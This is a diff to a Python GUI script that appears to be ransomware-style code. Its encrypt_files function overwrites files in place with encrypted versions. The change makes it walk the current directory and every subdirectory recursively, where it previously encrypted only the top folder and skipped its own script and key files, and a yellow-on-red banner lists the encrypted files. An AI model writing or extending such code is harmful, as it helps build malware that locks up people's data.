@@ -41,13 +41,13 @@ def encrypt_files():
     key = load_encryption_key()
     files = []
 
-    for file in os.listdir():
-        if file == "encrypt.py" or file == "encryption.key" or file == "encrypt.exe" or file == "encrypt.pyw":
-            continue
-        if os.path.isfile(file):
-            _, file_extension = os.path.splitext(file)
+    # Recorre el directorio actual y sus subdirectorios
+    for root, directories, filenames in os.walk('.'):
+        for filename in filenames:
+            filepath = os.path.join(root, filename)
+            _, file_extension = os.path.splitext(filepath)
             if file_extension.lower() in ALLOWED_EXTENSIONS:
-                files.append(file)
+                files.append(filepath)
 
     for file in files:
         with open(file, "rb") as thefile:
@@ -57,7 +57,8 @@ def encrypt_files():
         with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)
 
-        result_label.config(text=f"Following files have been encrypted: {files}", fg="yellow", bg="red")
+    result_label.config(text=f"Following files have been encrypted: {files}", fg="yellow", bg="red")
+
 
 #function to decrypt all files in the current directory
 def decrypt_files():
